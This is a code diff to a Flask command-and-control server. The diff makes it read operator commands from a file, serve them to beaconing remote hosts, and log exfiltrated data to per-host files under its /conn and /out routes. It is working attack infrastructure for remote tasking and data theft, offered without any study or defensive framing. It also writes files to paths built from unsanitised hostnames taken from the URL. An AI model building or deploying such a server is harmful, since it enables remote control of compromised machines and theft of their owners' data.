@@ -12,16 +12,20 @@ def root_dir():
 @app.route('/conn/<hostname>/<username>')
 @app.route('/conn/<hostname>/<username>/')
 def new_connection(hostname, username):
-    #cmd_file = open('command.txt')
-    #command = cmd_file.readline()
-    command = "whoami"
+    cmd_file = open('command.txt')
+    log_file = open("logs/" + hostname + ".txt", 'a')
+    command = cmd_file.readline()
 
     print('[+] Beacon from: ', hostname, ' as ', username)
+    log_file.writelines('[+] Beacon from: ' + hostname + ' as ' + username + '\n')
 
     if command != '':
-        print('[+] Command sent to ', hostname, ' as ', username)
+        print('[+] Command sent: ', command)
+        log_file.writelines('[+] Command sent: ' + command + '\n')
     else:
         pass
+
+    cmd_file.close()
 
     return command
 
@@ -29,8 +33,11 @@ def new_connection(hostname, username):
 @app.route('/out/<hostname>/<exfil>')
 @app.route('/out/<hostname>/<exfil>/')
 def exfil_data(hostname, exfil):
+    exil_file = open("exfil/" + hostname + ".txt", 'a')
     return_string = ''
+
     print('[i] Response from ', hostname, ": ", exfil)
+    exil_file.writelines('[i] Response from ' + hostname + ": " + exfil + '\n')
 
     return return_string
 
